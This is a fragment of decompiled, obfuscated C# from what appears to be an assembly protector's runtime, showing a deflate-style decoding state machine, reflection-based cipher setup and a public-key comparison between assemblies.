					class13_0.int_7 = num2 - 16;
					class13_0.int_2 = 5;
					goto case 5;
				}
				return false;
			}
			case 3:
				while (class13_0.int_8 < class13_0.int_5)
				{
					*(int*)ptr = Class15.smethod_5(class10_0, 3);
					if (*(int*)ptr >= 0)
					{
						Class15.smethod_29(class10_0, 3);
						class13_0.byte_0[Class8.Class13.int_9[class13_0.int_8]] = (byte)(*(uint*)ptr);
						class13_0.int_8++;
						continue;
					}
					return false;
				}
				class13_0.class12_0 = new Class8.Class12(class13_0.byte_0);
				class13_0.byte_0 = null;
				class13_0.int_8 = 0;
				class13_0.int_2 = 4;
				goto case 4;
			case 2:
				class13_0.int_5 = Class15.smethod_5(class10_0, 4);
				if (class13_0.int_5 >= 0)
				{
					class13_0.int_5 += 4;
					Class15.smethod_29(class10_0, 4);
					class13_0.byte_0 = new byte[19];
					class13_0.int_8 = 0;
					class13_0.int_2 = 3;
					goto case 3;
				}
				return false;
			case 1:
				class13_0.int_4 = Class15.smethod_5(class10_0, 5);
				if (class13_0.int_4 >= 0)
				{
					class13_0.int_4++;
					Class15.smethod_29(class10_0, 5);
					class13_0.int_6 = class13_0.int_3 + class13_0.int_4;
					class13_0.byte_1 = new byte[class13_0.int_6];
					class13_0.int_2 = 2;
					goto case 2;
				}
				return false;
			case 0:
				class13_0.int_3 = Class15.smethod_5(class10_0, 5);
				if (class13_0.int_3 >= 0)
				{
					class13_0.int_3 += 257;
					Class15.smethod_29(class10_0, 5);
					class13_0.int_2 = 1;
					goto case 1;
				}
				return false;
			}
			continue;
			IL_0080:
			class13_0.int_2 = 4;
		}
	}

	static ICryptoTransform smethod_35(byte[] byte_0, Class7 class7_0, byte[] byte_1, bool bool_0)
	{
		class7_0.type_0.GetProperty("Key")!.GetSetMethod()!.Invoke(class7_0.object_0, new object[1] { byte_0 });
		class7_0.type_0.GetProperty("IV")!.GetSetMethod()!.Invoke(class7_0.object_0, new object[1] { byte_1 });
		MethodInfo method = class7_0.type_0.GetMethod(bool_0 ? "CreateDecryptor" : "CreateEncryptor", new Type[0]);
		return (ICryptoTransform)method.Invoke(class7_0.object_0, new object[0]);
	}

	static bool smethod_36(Assembly assembly_0, Assembly assembly_1)
	{
		byte[] publicKey = assembly_1.GetName().GetPublicKey();
		byte[] publicKey2 = assembly_0.GetName().GetPublicKey();
		if (publicKey2 == null != (publicKey == null))
		{
			return false;
		}
		if (publicKey2 != null)
		{
			for (int i = 0; i < publicKey2.Length; i++)
			{
				if (publicKey2[i] != publicKey[i])
				{
					return false;
				}
			}
		}
		return true;
	}

	static void smethod_37(Class6 class6_0)
	{
		class6_0.type_0.GetMethod("Clear")!.Invoke(class6_0.object_0, new object[0]);
	}
}
